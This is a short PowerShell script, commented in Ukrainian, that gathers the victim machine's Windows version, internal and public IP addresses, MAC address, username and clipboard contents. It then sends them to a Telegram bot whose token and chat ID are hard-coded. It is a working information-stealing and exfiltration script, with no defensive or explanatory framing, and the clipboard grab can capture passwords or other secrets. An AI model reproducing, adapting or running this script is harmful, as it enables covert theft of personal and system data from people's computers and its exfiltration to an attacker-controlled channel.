# Отримуємо інформацію про операційну систему
$os = Get-CimInstance -ClassName Win32_OperatingSystem

# Отримуємо внутрішню IP-адресу, MAC-адресу та ім'я користувача
$ipAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.AddressState -eq 'Preferred'}).IPAddress
$macAddress = (Get-NetAdapter | Where-Object { $_.Status -eq 'Up' }).MacAddress
$userName = [System.Environment]::UserName
$clipboardContent = Get-Clipboard

# Отримуємо білу IP-адресу (зовнішню)
try {
    $publicIp = Invoke-RestMethod -Uri "https://api.ipify.org"
} catch {
    $publicIp = "Не вдалося отримати"
}

# Формуємо текст повідомлення
$message = @"
Внутрішня IP адреса: $ipAddress
Біла IP адреса: $publicIp
MAC адреса: $macAddress
Назва користувача: $userName
Версія Windows: $($os.Caption)
Архітектура ОС: $($os.OSArchitecture)
В буфері обміну: $clipboardContent
"@

# Відправляємо повідомлення через Telegram Bot API
Invoke-RestMethod -Uri "https://api.telegram.org/bot7269680347:AAElwpxygcNsIQxcUI44OvtqN2L-NIIDyPA/sendMessage" `
                  -Method Post `
                  -ContentType "application/x-www-form-urlencoded" `
                  -Body @{chat_id="6039088675"; text=$message}

pause
